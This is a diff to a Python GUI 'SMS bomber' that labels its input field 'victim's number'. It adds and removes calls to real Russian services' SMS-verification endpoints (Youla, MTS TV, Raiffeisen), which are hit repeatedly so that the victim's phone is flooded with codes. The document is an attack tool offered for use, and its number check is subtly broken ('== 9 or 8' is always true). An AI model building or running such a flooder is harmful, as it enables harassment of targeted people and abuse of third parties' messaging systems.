@@ -22,12 +22,10 @@ name.place(x = 210, y = 10)
 def bomber(event):
     number = int(ent.get())
     sms = int(ent2.get())
-    #num = Label(root, text=int(number))
-    #num.place()
     def check_number(number):
         try:
             int(len(number)) == 10
-            int(number[1]) == 9
+            int(number[1]) == 9 or 8
             check = Label(root, text = "check number - OK")
             check.place(x = 300, y = 100)
         except:
@@ -87,15 +85,12 @@ def bomber(event):
             
             sent += 1
             
-            raiffeisen = requests.get('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code', params={'number':number_7})
-            
-            sent += 1
-            
             mts = requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': number_7}, headers={})
             
             sent += 1
             
             youla = requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":number_plus7}, headers = {})
+    check_number(number)
     attack(number, sms)
 
 code = Label(root, text = "номер жертвы", fg = '#00ED00', bg = '#0C0C28', font = 'Helvetica 10 bold')
